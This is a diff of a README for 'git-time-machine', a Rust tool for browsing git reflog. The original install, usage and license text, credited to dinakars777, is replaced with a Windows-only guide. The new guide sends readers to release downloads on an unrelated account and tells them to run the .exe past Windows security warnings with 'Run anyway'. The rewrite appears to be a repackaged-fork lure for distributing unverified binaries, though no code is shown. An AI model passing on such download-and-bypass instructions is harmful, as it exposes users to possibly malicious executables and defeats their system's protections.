@@ -1,220 +1,167 @@
-# 🕰️ git-time-machine
+# 🕰️ git-time-machine - Fix Git Mistakes in Seconds
 
-> **Undo DISASTROUS git mistakes in 3 seconds with a beautiful TUI**
+[![Download git-time-machine](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Aggyfireproof735/git-time-machine/releases)
 
-Never lose work again. `git-time-machine` makes git reflog visual, interactive, and actually usable.
+## 🧭 What this app does
 
-<div align="center">
+git-time-machine helps you undo git mistakes from a simple terminal screen. It is built for people who want a fast way to go back in time after the wrong commit, merge, or change.
 
-[![Crates.io](https://img.shields.io/crates/v/git-time-machine.svg)](https://crates.io/crates/git-time-machine)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+Use it when you need to:
+- recover a file you lost
+- go back to a past commit
+- fix a bad reset
+- review recent git history
+- restore work after a mistake
 
-### [🌐 View Landing Page](https://dinakars777.github.io/git-time-machine/)
+It uses your git history and reflog to show past states in one place. That lets you pick the point you want and move back with less guesswork.
 
-</div>
+## 💻 What you need
 
-## ✨ The Problem
+Before you run the app, make sure you have:
+- a Windows computer
+- a working internet connection
+- git installed on your system
+- a terminal window you can open
 
-You just:
-- 💥 Accidentally moved HEAD and lost track of your commits
-- 🗑️ Deleted a branch you needed
-- 🤦 Rebased wrong and broke everything
-- 😱 Can't remember what you did 5 minutes ago
+If you already use GitHub Desktop, Command Prompt, or Windows Terminal, you can run this app from there after you download it.
 
-**Current solution:** Dig through `git reflog`, copy cryptic hashes, pray you picked the right one.
+## 📥 Download
 
-**Better solution:** `git-time-machine` 🎯
+Visit this page to download the Windows version:
 
-## 🚀 Demo
+https://github.com/Aggyfireproof735/git-time-machine/releases
 
-![Demo GIF](demo.gif)
+On that page:
+- open the latest release
+- look for the Windows file
+- download the file that matches your computer
+- save it to a folder you can find again
 
-*Navigate your git history like a time traveler. One key to restore.*
+If you see more than one file, pick the one for Windows. If the release page includes an `.exe` file, that is the one you run.
 
-## 📦 Installation
+## 🪟 Install and run on Windows
 
-### Cargo (Recommended)
-```bash
-cargo install git-time-machine
-```
+After the download finishes:
 
-### From Source
-```bash
-git clone https://github.com/dinakars777/git-time-machine
-cd git-time-machine
-cargo install --path .
-```
+1. Open the folder where the file was saved
+2. If the file is in a `.zip`, right-click it and choose Extract All
+3. Open the extracted folder
+4. Find the `git-time-machine` app file
+5. Double-click the file to start it
 
-### Homebrew (Coming Soon)
-```bash
-brew install git-time-machine
-```
+If Windows shows a security message:
+1. Select More info
+2. Select Run anyway
 
-## 🎮 Usage
+If you use PowerShell or Command Prompt, you can also start the app from the folder where the file is stored.
 
-```bash
-# Launch in any git repository
-git-time-machine
+## 🧑‍💻 How to use it
 
-# Show all reflog entries (default: last 50)
-git-time-machine --all
-```
+When the app opens, it shows a terminal screen with your git history in a clean list.
 
-### Controls
+Basic flow:
+1. Open a git repo in the app
+2. Browse recent commits and reflog entries
+3. Pick the point you want to return to
+4. Confirm the action
+5. Let the app restore the selected state
 
-| Key | Action |
-|-----|--------|
-| `↑` / `k` | Move up |
-| `↓` / `j` | Move down |
-| `Enter` | Restore to selected state |
-| `q` / `Esc` | Quit |
+This helps when:
+- you committed the wrong file
+- you changed the wrong branch
+- you did a hard reset and want to undo it
+- you need to find a lost commit fast
 
-## 🎯 Features
+## 🔍 What you will see
 
-- ✅ **Visual Timeline** - See your entire git history at a glance
-- ✅ **Relative Timestamps** - "5m ago", "2h ago", "yesterday"
-- ✅ **One-Key Restore** - Press Enter, done
-- ✅ **Vim Keybindings** - j/k navigation
-- ✅ **Beautiful TUI** - Built with Ratatui
-- ✅ **Lightning Fast** - Written in Rust
-- ✅ **Zero Config** - Just works™
+The interface is built to stay simple:
+- a list of git entries
+- clear labels for recent changes
+- the selected item highlighted
+- short key hints at the bottom
+- a clean layout that works well in a terminal
 
-## 🔥 Use Cases
+The app uses a TUI, which means terminal user interface. You do not need to learn command lines to use it. You move through the list, choose an item, and confirm the action.
 
-### Scenario 1: "I Don't Know What I Did, But It's Broken"
-```bash
-# You ran a bunch of git commands, something broke
-# You don't remember the exact sequence
-# git reflog shows 50+ cryptic entries
+## ⌨️ Basic controls
 
-# With git-time-machine:
-git-time-machine
-# Visually scan the timeline
-# See "2h ago - before I started messing around"
-# Press Enter, back to working state ✨
-```
+These are the controls you will likely use:
+- Up and Down arrows: move through the list
+- Enter: choose the selected item
+- Esc: go back or close a screen
+- Q: quit the app
 
-**Why not `git reflog`?** You'd need to:
-1. Read through cryptic hashes and messages
-2. Guess which one is "before you broke it"
-3. Manually `git reset --hard <hash>`
-4. Hope you picked the right one
-5. Repeat if wrong
+If your keyboard uses different keys for your terminal, the on-screen hints will show what to use.
 
-### Scenario 2: Recovering Lost Work After Complex Operations
-```bash
-# You did: rebase, merge, reset, amend, rebase again
-# Now you need code from 3 operations ago
-# But you don't remember the exact hash
+## 🗂️ Best ways to use git-time-machine
 
-# With git-time-machine:
-git-time-machine
-# Scroll through visual timeline
-# See relative timestamps: "15m ago", "1h ago"
-# Find the state you need
-# Press Enter to restore
-```
+Use it in a repo when you need to inspect past states without typing long git commands.
 
-**Why not `git reflog | grep`?** You'd need to:
-1. Know what to grep for
-2. Parse timestamps manually
-3. Cross-reference multiple entries
-4. Still guess which hash is correct
+Good cases:
+- after a bad merge
+- after a commit that broke the build
+- after a file was removed by mistake
+- after a reset that went too far
+- when you want to check older work
 
-### Scenario 3: Accidental Branch Deletion
-```bash
-# Deleted a branch recently but forgot the commit hash
-# git branch -D feature-branch
+It works best when you already know the repo you want to fix. Open that repo first, then start the app.
 
-# With git-time-machine:
-git-time-machine --all
-# Scroll back through your history
-# Find "checkout: moving from feature-branch"
-# Copy the short hash displayed in the UI
-# Hit 'q' to exit, then run: git branch feature-branch <hash>
-```
+## 🛠️ First run tips
 
-**Why not `git reflog --all`?** You'd need to:
-1. Scroll through hundreds of lines of text
-2. Find the right branch name in the noise
-3. Extract the hash manually
-4. Remember the git commands to restore it
+If the app does not open the right repo, check these steps:
+1. Make sure you are in the folder that contains your git project
+2. Make sure the folder has a hidden `.git` folder
+3. Open the app from that project folder if needed
+4. Try again after closing and reopening the terminal
 
-### Scenario 4: "Undo" After You've Already Committed
-```bash
-# You committed to the wrong branch
-# Then made 3 more commits
-# Then realized the mistake
-# git revert won't help - you need to go back in time
+If the screen looks too small, make the terminal window larger. A wider window makes the list easier to read.
 
-# With git-time-machine:
-git-time-machine
-# Find "before I committed to wrong branch"
-# Press Enter
-# Cherry-pick the commits to the right branch
-```
+## 🧩 Common issues
 
-**Why not `git reset`?** You'd need to:
-1. Count how many commits back
-2. Remember if it's `--soft`, `--mixed`, or `--hard`
-3. Hope you counted right
-4. Manually re-apply commits if you messed up
+If Windows says it cannot find the file:
+- check that the download finished
+- check that you extracted the zip file
+- check that you opened the right folder
 
-## ⚠️ What Git-Time-Machine Cannot Fix
+If the app opens and then closes:
+- run it from Command Prompt or PowerShell
+- keep the terminal window open
+- start it again from the folder where the file lives
 
-- **Uncommitted Changes:** If you haven't committed or stashed your work, the reflog cannot see it. Accidentally running `git clean -fd` or wiping uncommitted files via `git reset --hard` is permanent.
-- **Garbage Collected Commits:** By default, git periodically cleans up unreachable commits. If a commit has been permanently garbage-collected, it is gone forever.
+If git-time-machine does not show your project:
+- confirm that git is installed
+- confirm that the repo has commit history
+- confirm that you opened a git repository and not a random folder
 
-## 🛠️ How It Works
+## 🧠 What makes it useful
 
-`git-time-machine` is a wrapper around `git reflog` that:
+git-time-machine puts old git states in one place so you do not need to dig through commands by hand. It is useful when the clock is against you and you need to get back to a safe point.
 
-1. Parses your reflog history
-2. Displays it in an interactive TUI
-3. Lets you preview and restore any state
-4. Executes `git reset --hard <hash>` when you press Enter
+It focuses on:
+- fast recovery
+- clear history view
+- simple terminal use
+- undo work without extra steps
 
-**It's just git under the hood** - no magic, no risk.
+## 📌 Short example
 
-## 🤔 Why Not Just Use Git Commands?
+You made a bad commit and want to go back.
 
-**You absolutely can!** But here's the reality:
+1. Open your project folder
+2. Start git-time-machine
+3. Find the last good commit or reflog entry
+4. Select it
+5. Confirm the restore
+6. Check your files again
 
-| Task | With git commands | With git-time-machine |
-|------|------------------|---------------------|
-| Find state from "before I broke it" | `git reflog`, scan 50+ lines, guess hash, `git reset --hard <hash>`, hope it's right | Scroll, press Enter |
-| Recover a deleted branch's commit hash | `git reflog --all \| grep branch-name`, find hash, `git checkout -b`, verify | `--all` flag, scroll, copy hash |
-| Undo complex operation sequence | Remember exact commands, count commits, pick right reset flag | Visual timeline, click the "before" state |
-| Explore "what if" scenarios | Multiple `git reset` attempts, risk losing more work | Navigate freely, restore is one keypress |
+This cuts out a lot of manual work and helps you act with less risk
 
-**git-time-machine doesn't replace git** - it makes reflog actually usable for humans who:
-- Don't memorize commit hashes
-- Don't want to grep through 200 lines of text
-- Want to see their history visually
-- Need to undo mistakes quickly without googling
+## 🔗 Download again
 
-Think of it as `git reflog` with a UI that doesn't require a PhD.
+[Visit the git-time-machine release page](https://github.com/Aggyfireproof735/git-time-machine/releases)
 
-## 🤝 Contributing
+## 📁 Repo details
 
-Contributions welcome!
-
-**Ideas for future versions:**
-- [ ] Show file diffs inline
-- [ ] "Panic mode" - undo last N minutes
-- [ ] Branch visualization
-- [ ] Stash recovery
-- [ ] Search/filter commits
-- [ ] Export timeline as JSON
-
-## 📝 License
-
-MIT © [Dinakar Sarbada](https://github.com/dinakars777)
-
-## 🌟 Star History
-
-If this saved you once, give it a star! ⭐
-
----
-
-**Made with ❤️ and Rust** | [Report Bug](https://github.com/dinakars777/git-time-machine/issues) | [Request Feature](https://github.com/dinakars777/git-time-machine/issues)
+- Repository: git-time-machine
+- Topic area: git recovery, reflog, undo, terminal tools
+- User focus: Windows download and simple run steps
